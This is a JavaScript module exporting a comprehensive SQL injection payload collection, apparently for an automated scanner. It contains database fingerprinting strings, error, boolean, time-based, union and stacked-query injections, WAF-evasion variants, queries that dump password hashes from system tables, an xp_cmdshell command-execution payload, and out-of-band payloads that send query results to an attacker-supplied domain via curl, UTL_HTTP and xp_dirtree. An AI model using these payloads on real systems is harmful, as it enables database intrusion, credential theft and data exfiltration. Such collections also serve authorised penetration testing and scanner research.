// SQL Injection Payloads - Comprehensive collection

export const DBMS_FINGERPRINTS = {
  mysql: {
    errors: [
      "you have an error in your sql syntax",
      "warning: mysql",
      "unclosed quotation mark",
      "mysql_fetch",
      "mysql_num_rows",
      "supplied argument is not a valid mysql",
      "Column count doesn't match",
      "MySQL server version",
      "com.mysql.jdbc",
      "MySqlException",
      "MariaDB server version"
    ],
    version: ["VERSION()", "@@version", "@@version_comment"],
    comment: ["#", "-- ", "/**/"],
    concat: ["CONCAT(", "CONCAT_WS("],
    sleep: "SLEEP({time})",
    benchmark: "BENCHMARK({count},MD5('a'))"
  },
  postgresql: {
    errors: [
      "postgresql query failed",
      "pg_query",
      "pg_exec",
      "PSQLException",
      "org.postgresql",
      "ERROR:  syntax error at or near",
      "unterminated quoted string",
      "invalid input syntax for"
    ],
    version: ["version()", "current_setting('server_version')"],
    comment: ["--", "/**/"],
    concat: ["||", "CONCAT("],
    sleep: "PG_SLEEP({time})"
  },
  mssql: {
    errors: [
      "microsoft sql native client error",
      "mssql_query",
      "odbc sql server driver",
      "SQLServer JDBC Driver",
      "com.microsoft.sqlserver",
      "Unclosed quotation mark after the character string",
      "Incorrect syntax near",
      "SqlException",
      "Conversion failed when converting"
    ],
    version: ["@@version", "SERVERPROPERTY('productversion')"],
    comment: ["--", "/**/"],
    concat: ["+", "CONCAT("],
    sleep: "WAITFOR DELAY '0:0:{time}'"
  },
  oracle: {
    errors: [
      "ora-00933",
      "ora-00921",
      "ora-01756",
      "ora-00936",
      "oracle error",
      "quoted string not properly terminated",
      "OracleException",
      "java.sql.SQLException"
    ],
    version: ["banner FROM v$version", "version FROM v$instance"],
    comment: ["--", "/**/"],
    concat: ["||", "CONCAT("],
    sleep: "DBMS_PIPE.RECEIVE_MESSAGE('a',{time})"
  },
  sqlite: {
    errors: [
      "sqlite3.OperationalError",
      "SQLite3::SQLException",
      "SQLITE_ERROR",
      'near "": syntax error',
      "unrecognized token"
    ],
    version: ["sqlite_version()"],
    comment: ["--", "/**/"],
    concat: ["||"],
    sleep: "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({time}00000000/2))))"
  }
};

export const ERROR_BASED_PAYLOADS = [
  // Basic quotes
  "'",
  "\"",
  "`",
  "''",
  "\"\"",
  "``",

  // Closing brackets
  "')",
  "'))",
  "')))",
  "\")",
  "\"))",

  // Basic arithmetic
  "' OR '1'='1",
  "\" OR \"1\"=\"1",
  "' OR 1=1--",
  "\" OR 1=1--",
  "' OR 1=1#",
  "\" OR 1=1#",
  "1' OR '1'='1",
  "1\" OR \"1\"=\"1",

  // Comments
  "'--",
  "'#",
  "'/*",
  "\"--",
  "\"#",
  "\"/*",

  // Error triggers
  "' AND 1=CONVERT(int,(SELECT @@version))--",
  "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

  // Double encoding
  "%27",
  "%22",
  "%2527",
  "%2522",

  // Unicode
  "＇",
  "＂",

  // Null byte
  "'\x00",
  "\"\x00"
];

export const BOOLEAN_BASED_PAYLOADS = [
  // True conditions
  { true: "' AND '1'='1", false: "' AND '1'='2" },
  { true: "\" AND \"1\"=\"1", false: "\" AND \"1\"=\"2" },
  { true: "' AND 1=1--", false: "' AND 1=2--" },
  { true: "\" AND 1=1--", false: "\" AND 1=2--" },
  { true: "') AND ('1'='1", false: "') AND ('1'='2" },
  { true: "')) AND (('1'='1", false: "')) AND (('1'='2" },
  { true: "' AND 1=1#", false: "' AND 1=2#" },
  { true: "1 AND 1=1", false: "1 AND 1=2" },
  { true: "1) AND (1=1", false: "1) AND (1=2" },

  // OR based
  { true: "' OR '1'='1", false: "' OR '1'='2" },
  { true: "\" OR \"1\"=\"1", false: "\" OR \"1\"=\"2" },
  { true: "' OR 1=1--", false: "' OR 1=2--" },

  // Numeric
  { true: "1 AND 1=1", false: "1 AND 1=2" },
  { true: "-1 OR 1=1", false: "-1 OR 1=2" },
  { true: "1*1", false: "1*0" }
];

export const TIME_BASED_PAYLOADS = [
  // MySQL
  "' AND SLEEP({time})--",
  "\" AND SLEEP({time})--",
  "' AND SLEEP({time})#",
  "') AND SLEEP({time})--",
  "')) AND SLEEP({time})--",
  "1' AND SLEEP({time})--",
  "' OR SLEEP({time})--",
  "' AND (SELECT SLEEP({time}))--",
  "' AND BENCHMARK(10000000,MD5('a'))--",
  "';SELECT SLEEP({time})--",
  "1;SELECT SLEEP({time})--",

  // PostgreSQL
  "' AND PG_SLEEP({time})--",
  "\" AND PG_SLEEP({time})--",
  "'; SELECT PG_SLEEP({time})--",
  "1; SELECT PG_SLEEP({time})--",
  "' || PG_SLEEP({time})--",

  // MSSQL
  "'; WAITFOR DELAY '0:0:{time}'--",
  "' AND WAITFOR DELAY '0:0:{time}'--",
  "1; WAITFOR DELAY '0:0:{time}'--",
  "\"; WAITFOR DELAY '0:0:{time}'--",
  "'); WAITFOR DELAY '0:0:{time}'--",

  // Oracle
  "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
  "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",

  // SQLite
  "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({time}00000000/2))))--"
];

export const UNION_BASED_PAYLOADS = [
  // Column enumeration
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",

  // ORDER BY enumeration
  "' ORDER BY 1--",
  "' ORDER BY 2--",
  "' ORDER BY 3--",
  "' ORDER BY 4--",
  "' ORDER BY 5--",
  "' ORDER BY 10--",
  "' ORDER BY 20--",
  "' ORDER BY 50--",
  "' ORDER BY 100--"
];

export const STACKED_QUERIES = [
  // MySQL
  "'; SELECT 1--",
  "'; SELECT @@version--",
  "'; INSERT INTO test VALUES(1)--",

  // MSSQL
  "'; EXEC xp_cmdshell('whoami')--",
  "'; EXEC sp_configure 'show advanced options', 1--",

  // PostgreSQL
  "'; SELECT version()--",
  "'; CREATE TABLE test(id int)--"
];

export const WAF_BYPASS_PAYLOADS = [
  // Case variation
  "' uNiOn SeLeCt NULL--",
  "' UnIoN sElEcT NULL--",

  // Inline comments
  "' UN/**/ION SEL/**/ECT NULL--",
  "' /*!UNION*/ /*!SELECT*/ NULL--",
  "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",

  // Whitespace alternatives
  "'\tUNION\tSELECT\tNULL--",
  "'\nUNION\nSELECT\nNULL--",
  "'\rUNION\rSELECT\rNULL--",
  "'%09UNION%09SELECT%09NULL--",
  "'%0AUNION%0ASELECT%0ANULL--",
  "'%0DUNION%0DSELECT%0DNULL--",
  "'%0CUNION%0CSELECT%0CNULL--",
  "'%A0UNION%A0SELECT%A0NULL--",

  // Double URL encoding
  "%252527",
  "%2527%2527",

  // Comments between keywords
  "'/**/UNION/**/SELECT/**/NULL--",
  "'/**_**/UNION/**_**/SELECT/**_**/NULL--",

  // Concat obfuscation
  "' UNION SELECT CONCAT(0x61,0x62,0x63)--",
  "' UNION SELECT CHR(65)||CHR(66)||CHR(67)--",

  // Hex encoding
  "' UNION SELECT 0x61626364--",

  // Scientific notation
  "1e0UNION SELECT NULL--",
  "1.e0UNION SELECT NULL--"
];

export const DATA_EXTRACTION = {
  mysql: {
    databases: "SELECT schema_name FROM information_schema.schemata",
    tables: "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
    data: "SELECT {columns} FROM {db}.{table}",
    users: "SELECT user,password FROM mysql.user",
    currentDb: "SELECT database()",
    currentUser: "SELECT user()",
    hostname: "SELECT @@hostname"
  },
  postgresql: {
    databases: "SELECT datname FROM pg_database",
    tables: "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    data: "SELECT {columns} FROM {table}",
    users: "SELECT usename,passwd FROM pg_shadow",
    currentDb: "SELECT current_database()",
    currentUser: "SELECT current_user",
    hostname: "SELECT inet_server_addr()"
  },
  mssql: {
    databases: "SELECT name FROM master..sysdatabases",
    tables: "SELECT name FROM {db}..sysobjects WHERE xtype='U'",
    columns: "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='{table}')",
    data: "SELECT {columns} FROM {db}..{table}",
    users: "SELECT name,password_hash FROM sys.sql_logins",
    currentDb: "SELECT DB_NAME()",
    currentUser: "SELECT SYSTEM_USER",
    hostname: "SELECT @@SERVERNAME"
  },
  oracle: {
    databases: "SELECT DISTINCT owner FROM all_tables",
    tables: "SELECT table_name FROM all_tables WHERE owner='{db}'",
    columns: "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
    data: "SELECT {columns} FROM {db}.{table}",
    users: "SELECT username,password FROM dba_users",
    currentDb: "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual",
    currentUser: "SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual",
    hostname: "SELECT UTL_INADDR.GET_HOST_NAME FROM dual"
  },
  sqlite: {
    databases: "SELECT name FROM pragma_database_list",
    tables: "SELECT name FROM sqlite_master WHERE type='table'",
    columns: "SELECT name FROM pragma_table_info('{table}')",
    data: "SELECT {columns} FROM {table}",
    currentDb: "SELECT 'main'",
    currentUser: "SELECT 'N/A'"
  }
};

export const OOB_PAYLOADS = {
  mysql: [
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{domain}\\\\a'))--",
    "' UNION SELECT * INTO OUTFILE '\\\\\\\\{domain}\\\\a'--"
  ],
  mssql: [
    "'; EXEC master..xp_dirtree '//{domain}/a'--",
    "'; EXEC master..xp_subdirs '//{domain}/a'--",
    "'; EXEC master..xp_fileexist '//{domain}/a'--",
    "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server={domain};','SELECT 1')--"
  ],
  oracle: [
    "' UNION SELECT UTL_HTTP.REQUEST('http://{domain}/'||({query})) FROM dual--",
    "' UNION SELECT HTTPURITYPE('http://{domain}/'||({query})).GETCLOB() FROM dual--",
    "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(({query})||'.{domain}') FROM dual--"
  ],
  postgresql: [
    "'; COPY (SELECT '') TO PROGRAM 'curl http://{domain}/'||({query})--",
    "' UNION SELECT dblink_connect('host={domain} user='||({query}))--"
  ]
};
